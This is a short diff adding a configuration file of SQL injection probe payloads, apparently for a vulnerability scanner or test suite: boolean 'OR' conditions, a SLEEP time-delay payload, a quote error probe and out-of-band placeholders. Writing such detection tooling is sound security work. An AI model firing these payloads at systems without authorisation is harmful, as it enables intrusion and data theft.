@@ -1,0 +1,6 @@
+boolean_true_payload: "1' OR '1'='1"
+boolean_false_payload: "1' OR '1'='2"
+time_delay_payload: "1' OR SLEEP(3)-- "
+error_probe_payload: "'"
+oob_dns_payload: "OOB_PLACEHOLDER"
+oob_http_payload: "OOB_PLACEHOLDER"
